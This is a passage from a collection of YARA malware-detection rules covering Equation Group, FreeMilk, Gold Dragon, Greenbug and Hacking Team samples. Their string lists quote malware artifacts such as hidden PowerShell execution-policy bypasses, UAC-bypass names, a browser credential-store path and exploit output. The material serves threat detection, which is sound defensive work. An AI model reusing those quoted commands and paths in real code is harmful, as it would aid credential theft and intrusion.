fullword ascii\n        $s2 = \"EXEC Packet Processed\" fullword ascii\n        $s3 = \"Failed to insert the command into command list.\" fullword ascii\n        $s4 = \"Send_Packet: Trying to send too much data.\" fullword ascii\n        $s5 = \"payloadLength >= MAX_ALLOW_SIZE.\" fullword ascii\n        $s6 = \"Wrong Payload Size\" fullword ascii\n        $s7 = \"Unknown packet received......\" fullword ascii\n        $s8 = \"Returned eax = %08x\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 6000KB and (2 of ($s*))) or (5 of them)\n}\n\nrule EquationGroup_eligiblebombshell_generic\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_eligiblebombshell_generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"logging.error(\\\"       Perhaps you should run with --scan?\\\")\" fullword ascii\n        $s2 = \"logging.error(\\\"ERROR: No entry for ETag [%s] in %s.\\\" %\" fullword ascii\n        $s3 = \"\\\"be supplied\\\")\" fullword ascii\n\n    condition:\n        (filesize < 70KB and 2 of ($s*)) or (all of them)\n}\n\nrule EquationGroup_ssh_telnet_29\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: ssh.py, telnet.py)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_ssh_telnet_29\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"received prompt, we're in\" fullword ascii\n        $s2 = \"failed to login, bad creds, abort\" fullword ascii\n        $s3 = \"sending command \\\" + str(n) + \\\"/\\\" + str(tot) + \\\", len \\\" + str(len(chunk) + \" fullword ascii\n        $s4 = \"received nat - EPBA: ok, payload: mangled, did not run\" fullword ascii\n        $s5 = \"no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return\" ascii\n        $s6 = \"received arp - EPBA: ok, payload: fail\" fullword ascii\n        $s7 = \"chopped = string.rstrip(payload, \\\"\\\\x0a\\\")\" fullword ascii\n\n    condition:\n        (filesize < 10KB and 2 of them) or (3 of them)\n}\n\nrule EquationGroup_tinyexec\n{\n    meta:\n        description = \"EQGRP Toolset Firewall  (files: tinyexec)\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_tinyexec\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 73 68 73 74 72 74 61 62 00 2E 74 65 78 74 }\n        $s2 = { 5A 58 55 52 89 E2 55 50 89 E1 }\n\n    condition:\n        uint32(0) == 0x464c457f and filesize < 270 and all of them\n}\n\nrule EquationGroup_callbacks\n{\n    meta:\n        description = \"EQGRP Toolset Firewall - Callback addresses\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_callbacks\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"30.40.50.60:9342\" fullword ascii wide\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_Extrabacon_Output\n{\n    meta:\n        description = \"EQGRP Toolset Firewall - Extrabacon exploit output\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Extrabacon_Output\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"|###[ SNMPresponse ]###\" fullword ascii\n        $s2 = \"[+] generating exploit for exec mode pass-disable\" fullword ascii\n        $s3 = \"[+] building payload for mode pass-disable\" fullword ascii\n        $s4 = \"[+] Executing:  extrabacon\" fullword ascii\n        $s5 = \"appended AAAADMINAUTH_ENABLE payload\" fullword ascii\n\n    condition:\n        2 of them\n}\n\nrule EquationGroup_Unique_Strings\n{\n    meta:\n        description = \"EQGRP Toolset Firewall - Unique strings\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_Unique_Strings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"/BananaGlee/ELIGIBLEBOMB\" ascii\n        $s2 = \"Protocol must be either http or https (Ex: https://1.2.3.4:1234)\"\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_RC5_RC6_Opcode\n{\n    meta:\n        description = \"EQGRP Toolset Firewall - RC5 / RC6 opcode\"\n        threat_names = \"Equation Group\"\n        ref = \"https://securelist.com/blog/incidents/75812/the-equation-giveaway/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EQGRP_RC5_RC6_Opcode\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 8B 74 91 FC 81 EE 47 86 C8 61 89 34 91 42 83 FA 2B }\n\n    condition:\n        1 of them\n}\n\nrule EquationGroup_FVEY_ShadowBroker_Auct_Dez16_Strings\n{\n    meta:\n        description = \"String from the ShodowBroker Files Screenshots - Dec 2016\"\n        threat_names = \"Equation Group\"\n        ref = \"https://bit.no.com:43110/theshadowbrokers.bit/post/message6/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FVEY_ShadowBroker_Auct_Dez16_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"bs.ratload\" fullword ascii\n        $s2 = \"Auditcleaner\" fullword ascii\n        $s3 = \"bll.perlbind\" fullword ascii\n        $s4 = \"bll.perlcallback\" fullword ascii\n        $s5 = \"bll.telnet\" fullword ascii\n        $s6 = \"bll.tnc.gr\" fullword ascii\n        $s7 = \"clean_wtmps.py\" fullword ascii\n        $s8 = \"cmsex.auto\" fullword ascii\n        $s9 = \"cottonaxe\" fullword ascii\n        $s10 = \"dectelnet.sh\" fullword ascii\n        $s11 = \"elatedmonkey\" fullword ascii\n        $s12 = \"electricslide.pl\" fullword ascii\n        $s13 = \"endlessdonut\" fullword ascii\n        $s14 = \"solaris8shellcode\" fullword ascii\n        $s15 = \"solaris9shellcode\" fullword ascii\n        $s16 = \"solaris10shellcode\" fullword ascii\n        $s17 = \"ys.ratload.sh\" fullword ascii\n        $elf1 = \"catflap\" fullword ascii\n        $elf2 = \"charm_penguin\" fullword ascii\n        $elf3 = \"charm_hammer\" fullword ascii\n        $elf4 = \"charm_saver\" fullword ascii\n        $elf5 = \"dampcrowd\" fullword ascii\n        $elf7 = \"dubmoat\" fullword ascii\n        $elf8 = \"ebbshave\" fullword ascii\n        $elf9 = \"eggbasket\" fullword ascii\n        $elf10 = \"toffeehammer\" fullword ascii\n        $elf11 = \"enemyrun\" fullword ascii\n        $elf12 = \"envoytomato\" fullword ascii\n        $elf13 = \"expoxyresin\" fullword ascii\n        $elf14 = \"estopmoonlit\" fullword ascii\n        $elf15 = \"linux-exactchange\" fullword ascii\n        $elf17 = \"ghost_sparc\" fullword ascii\n        $elf18 = \"jackpop\" fullword ascii\n        $elf19 = \"orleans_stride\" fullword ascii\n        $elf20 = \"prokserver\" fullword ascii\n        $elf21 = \"seconddate\" fullword ascii\n        $elf22 = \"shentysdelight\" fullword ascii\n        $elf23 = \"skimcountry\" fullword ascii\n        $elf24 = \"slyheretic\" fullword ascii\n        $elf25 = \"stoicsurgeon\" fullword ascii\n        $elf26 = \"strifeworld\" fullword ascii\n        $elf27 = \"suaveeyeful\" fullword ascii\n        $elf28 = \"suctionchar\" fullword ascii\n        $elf29 = \"vs.attack.linux\" fullword ascii\n        $pe1 = \"charm_razor\" fullword ascii wide\n        $pe2 = \"charm_saver\" fullword ascii wide\n        $pe3 = \"ghost_x86\" fullword ascii wide\n\n    condition:\n        (uint16(0) == 0x457f and 1 of ($elf*)) or (uint16(0) == 0x5a4d and 1 of ($pe*)) or 1 of ($s*)\n}\n\nrule FreeMilk_APT_Mal_1\n{\n    meta:\n        description = \"Malware from FreeMilk campaign\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n        threat_names = \"FreeMilk, APT37\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeMilk_APT_Mal_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\milk\\\\Release\\\\milk.pdb\" ascii\n        $x2 = \"E:\\\\BIG_POOH\\\\Project\\\\\" ascii\n        $x3 = \"Windows-KB271854-x86.exe\" fullword wide\n        $s1 = \"Windows-KB275122-x86.exe\" fullword wide\n        $s2 = \"\\\\wsatra.tmp\" fullword wide\n        $s3 = \"%s\\\\Rar0tmpExtra%d.rtf\" fullword wide\n        $s4 = \"\\\"%s\\\" help\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"108aa007b3d1b4817ff4c04d9b254b39\" or 1 of ($x*) or 4 of them)\n}\n\nrule FreeMilk_APT_Mal_2\n{\n    meta:\n        description = \"Malware from FreeMilk campaign\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n        threat_names = \"FreeMilk, APT37\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeMilk_APT_Mal_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"failed to take the screenshot. err: %d\" fullword ascii\n        $s2 = \"runsample\" fullword wide\n        $s3 = \"%s%02X%02X%02X%02X%02X%02X:\" fullword wide\n        $s4 = \"win-%d.%d.%d-%d\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and (pe.imphash() == \"b86f7d2c1c182ec4c074ae1e16b7a3f5\" or all of them)\n}\n\nrule FreeMilk_APT_Mal_3\n{\n    meta:\n        description = \"Malware from FreeMilk campaign\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n        threat_names = \"FreeMilk, APT37\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeMilk_APT_Mal_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"CMD.EXE /C \\\"%s\\\"\" fullword wide\n        $s2 = \"\\\\command\\\\start.exe\" fullword wide\n        $s3 = \".bat;.com;.cmd;.exe\" fullword wide\n        $s4 = \"Unexpected failure opening HKCR key: %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and all of them)\n}\n\nrule FreeMilk_APT_Mal_4\n{\n    meta:\n        description = \"Malware from FreeMilk campaign\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/10/unit42-freemilk-highly-targeted-spear-phishing-campaign/\"\n        threat_names = \"FreeMilk, APT37\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeMilk_APT_Mal_4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"base64Encoded=\\\"TVqQAAMAAAAE\" ascii\n        $s1 = \"SOFTWARE\\\\Clients\\\\StartMenuInternet\\\\firefox.exe\\\\shell\\\\open\\\\command\" fullword wide\n        $s2 = \"'Wscript.echo \\\"Base64 encoded: \\\" + base64Encoded\" fullword ascii\n        $s3 = \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n        $s4 = \"outFile=sysDir&\\\"\\\\rundll32.exe\\\"\" fullword ascii\n        $s5 = \"set shell = WScript.CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n        $s6 = \"command =outFile &\\\" sysupdate\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and ((pe.exports(\"getUpdate\") and pe.number_of_exports == 1) or 1 of ($x*) or 3 of them)\n}\n\nrule GoldDragon_malware_Feb18_1\n{\n    meta:\n        description = \"Malware from Gold Dragon report\"\n        ref = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n        threat_names = \"Gold Dragon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldDragon_malware_Feb18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"168c2f7752511dfd263a83d5d08a90db\" or pe.imphash() == \"0606858bdeb129de33a2b095d7806e74\" or pe.imphash() == \"51d992f5b9e01533eb1356323ed1cb0f\" or pe.imphash() == \"bb801224abd8562f9ee8fb261b75e32a\")\n}\n\nrule GoldDragon_Aux_File\n{\n    meta:\n        description = \"Export from Gold Dragon - February 2018\"\n        ref = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n        threat_names = \"Gold Dragon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldDragon_Aux_File\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"/////////////////////regkeyenum////////////\" ascii\n\n    condition:\n        filesize < 500KB and 1 of them\n}\n\nrule GoldDragon_RunningRAT\n{\n    meta:\n        description = \"Running RAT from Gold Dragon report\"\n        ref = \"https://goo.gl/rW1yvZ\"\n        threat_names = \"Gold Dragon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldDragon_RunningRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C:\\\\USERS\\\\WIN7_x64\\\\result.log\" fullword wide\n        $x2 = \"rundll32.exe %s RunningRat\" fullword ascii\n        $x3 = \"SystemRat.dll\" fullword ascii\n        $x4 = \"rundll32.exe %s ExportFunction\" fullword ascii\n        $x5 = \"rundll32.exe \\\"%s\\\" RunningRat\" fullword ascii\n        $x6 = \"ixeorat.bin\" fullword ascii\n        $x7 = \"C:\\\\USERS\\\\Public\\\\result.log\" fullword ascii\n        $a1 = \"emanybtsohteg\" fullword ascii\n        $a2 = \"tekcosesolc\" fullword ascii\n        $a3 = \"emankcosteg\" fullword ascii\n        $a4 = \"emantsohteg\" fullword ascii\n        $a5 = \"tpokcostes\" fullword ascii\n        $a6 = \"putratSASW\" fullword ascii\n        $s1 = \"ParentDll.dll\" fullword ascii\n        $s2 = \"MR - Already Existed\" fullword ascii\n        $s3 = \"MR First Started, Registed OK!\" fullword ascii\n        $s4 = \"RM-M : LoadResource OK!\" fullword ascii\n        $s5 = \"D:\\\\result.log\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"c78ccc8f02286648c4373d3bf03efc43\" or pe.exports(\"RunningRat\") or 1 of ($x*) or 5 of ($a*) or 3 of ($s*))\n}\n\nrule GoldDragon_RunnignRAT\n{\n    meta:\n        description = \"Running RAT malware from Gold Dragon report\"\n        ref = \"https://goo.gl/rW1yvZ\"\n        threat_names = \"Gold Dragon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoldDragon_RunnignRAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c systeminfo \" fullword ascii\n        $s2 = \"ieproxy.dll\" fullword ascii\n        $s3 = \"taskkill /f /im daumcleaner.exe\" fullword ascii\n        $s4 = \"cmd.exe /c tasklist \" fullword ascii\n        $s5 = \"rundll32.exe \\\"%s\\\" Run\" fullword ascii\n        $s6 = \"Mozilla/5.0 (Windows NT 5.2; rv:12.0) Gecko/20100101 Firefox/12.0\" fullword ascii\n        $s7 = \"%s\\\\%s_%03d\" fullword wide\n        $s8 = \"\\\\PI_001.dat\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and (3 of them)\n}\n\nrule Greenbug_Malware_1\n{\n    meta:\n        description = \"Malware from Greenbug Incident\"\n        ref = \"https://goo.gl/urp4CD\"\n        threat_names = \"Greenbug\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Greenbug_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"vailablez\" fullword ascii\n        $s2 = \"Sfouglr\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule Greenbug_Malware_2\n{\n    meta:\n        description = \"Backdoor from Greenbug Incident\"\n        ref = \"https://goo.gl/urp4CD\"\n        threat_names = \"Greenbug\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Greenbug_Malware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"|||Command executed successfully\" fullword ascii\n        $x2 = \"\\\\Release\\\\Bot Fresh.pdb\" ascii\n        $x3 = \"C:\\\\ddd\\\\a1.txt\" fullword wide\n        $x4 = \"Bots\\\\Bot5\\\\x64\\\\Release\" ascii\n        $x5 = \"Bot5\\\\Release\\\\Ism.pdb\" ascii\n        $x6 = \"Bot\\\\Release\\\\Ism.pdb\" ascii\n        $x7 = \"\\\\Bot Fresh\\\\Release\\\\Bot\" ascii\n        $s1 = \"/Home/SaveFile?commandId=CmdResult=\" fullword wide\n        $s2 = \"raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday\" fullword ascii\n        $s3 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n        $s4 = \"SELECT * FROM AntiVirusProduct\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($x*) or 2 of them)) or (3 of them)\n}\n\nrule Greenbug_Malware_3\n{\n    meta:\n        description = \"Backdoor from Greenbug Incident\"\n        ref = \"https://goo.gl/urp4CD\"\n        threat_names = \"Greenbug\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Greenbug_Malware_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"F:\\\\Projects\\\\Bot\\\\Bot\\\\Release\\\\Ism.pdb\" fullword ascii\n        $x2 = \"C:\\\\ddd\\\\wer2.txt\" fullword wide\n        $x3 = \"\\\\Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n\n    condition:\n        1 of them\n}\n\nrule Greenbug_Malware_4\n{\n    meta:\n        description = \"ISMDoor Backdoor\"\n        ref = \"https://goo.gl/urp4CD\"\n        threat_names = \"Greenbug\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Greenbug_Malware_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"powershell.exe -nologo -windowstyle hidden -c \\\"Set-ExecutionPolicy -scope currentuser\" fullword ascii\n        $s2 = \"powershell.exe -c \\\"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \\\"\" fullword ascii\n        $s3 = \"c:\\\\windows\\\\temp\\\\tmp8873\" fullword ascii\n        $s4 = \"taskkill /im winit.exe /f\" fullword ascii\n        $s5 = \"invoke-psuacme\"\n        $s6 = \"-method oobe -payload \\\"\\\"\" fullword ascii\n        $s7 = \"C:\\\\ProgramData\\\\stat2.dat\" fullword wide\n        $s8 = \"Invoke-bypassuac\" fullword ascii\n        $s9 = \"Start Keylog Done\" fullword wide\n        $s10 = \"Microsoft\\\\Windows\\\\WinIt.exe\" fullword ascii\n        $s11 = \"Microsoft\\\\Windows\\\\Tmp9932u1.bat\\\"\" fullword ascii\n        $s12 = \"Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them) or (3 of them)\n}\n\nrule HackingTeam_bin_ndisk\n{\n    meta:\n        description = \"Hacking Team Disclosure Sample (file: ndisk.sys)\"\n        ref = \"https://www.virustotal.com/en/file/a03a6ed90b89945a992a8c69f716ec3c743fa1d958426f4c50378cca5bef0a01/analysis/1436184181/\"\n        threat_names = \"Hacking Team\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"bin_ndisk\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\Registry\\\\Machine\\\\System\\\\ControlSet00%d\\\\services\\\\ndisk.sys\" fullword wide\n        $s2 = \"\\\\Registry\\\\Machine\\\\System\\\\ControlSet00%d\\\\Enum\\\\Root\\\\LEGACY_NDISK.SYS\" fullword wide\n        $s3 = \"\\\\Driver\\\\DeepFrz\" fullword wide\n        $s4 = \"Microsoft Kernel Disk Manager\" fullword wide\n        $s5 = \"ndisk.sys\" fullword wide\n        $s6 = \"\\\\Device\\\\MSH4DEV1\" fullword wide\n        $s7 = \"\\\\DosDevices\\\\MSH4DEV1\" fullword wide\n        $s8 = \"built by: WinDDK\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 6 of them\n}\n\nrule HackingTeam_Elevator_DLL\n{\n    meta:\n        description = \"Hacking Team Disclosure Sample (file: elevator.dll)\"\n        ref = \"http://t.co/EG0qtVcKLh\"\n        threat_names = \"Hacking Team\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Hackingteam_Elevator_DLL\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n        $s2 = \"setx TOR_CONTROL_PASSWORD\" fullword ascii\n        $s3 = \"mitmproxy0\" fullword ascii\n        $s4 = \"\\\\insert_cert.exe\" fullword ascii\n        $s5 = \"elevator.dll\" fullword ascii\n        $s6 = \"CRTDLL.DLL\" fullword ascii\n        $s7 = \"fail adding cert\" fullword ascii\n        $s8 = \"DownloadingFile\" fullword ascii\n        $s9 = \"fail adding cert: %s\" fullword ascii\n        $s10 = \"InternetOpenA fail\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 6 of them\n}\n\nrule HackingTeam_Elevator_EXE\n{\n    meta:\n        description = \"Hacking Team Disclosure Sample (file: elevator.exe)\"\n        threat_names = \"Hacking Team\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HackingTeam_Elevator_EXE\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"CRTDLL.DLL\" fullword ascii\n        $x2 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n        $x3 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" fullword ascii\n        $x4 = \"C:\\\\\\\\Windows\\\\\\\\Sysnative\\\\\\\\ntoskrnl.exe\" fullword ascii\n        $s1 = \"[*] traversing processes\" fullword ascii\n        $s2 = \"_getkprocess\" fullword ascii\n        $s3 = \"[*] LoaderConfig %p\" fullword ascii\n        $s4 = \"loader.obj\" fullword ascii\n        $s5 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii\n        $s6 = \"[*] token restore\" fullword ascii\n        $s7 = \"elevator.obj\" fullword ascii\n        $s8 = \"_getexport\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of ($x*) and 3 of ($s*)\n}\n\nrule HackingTeam_RCS_Backdoor\n{\n    meta:\n        description = \"Hacking Team RCS Backdoor\"\n        threat_names = \"Hacking Team\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RCS_Backdoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $filter1 = \"$debug3\"\n        $filter2 = \"$log2\"\n        $filter3 = \"error2\"\n        $debug1 = /\\- (C)hecking components/ wide ascii\n        $debug2 = /\\- (A)ctivating hiding system/ wide ascii\n        $debug3 = /(f)ully operational/ wide ascii\n        $log1 = /\\- Browser activity \\(FF\\)/ wide ascii\n        $log2 = /\\- Browser activity \\(IE\\)/ wide ascii\n        $error1 = /\\[Unable to deploy\\]/ wide ascii\n        $error2 = /\\[The system is already monitored\\]/ wide ascii\n\n    condition:\n        (2 of ($debug*) or 2 of ($log*) or all of ($error*)) and not any of ($filter*)\n}\n\nrule HackingTeam_RCS_Scout\n{\n    meta:\n        description = \"Hacking Team RCS Scout\"\n        threat_names = \"Hacking Team\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"botherder https://github.com/botherder\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RCS_Scout\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $filter1 = \"$engine5\"\n        $filter2 = \"$start4\"\n        $filter3 = \"$upd2\"\n        $filter4 = \"$lookma6\"\n        $engine1 = /(E)ngine started/ wide ascii\n        $engine2 = /(R)unning in background/ wide ascii\n        $engine3 = 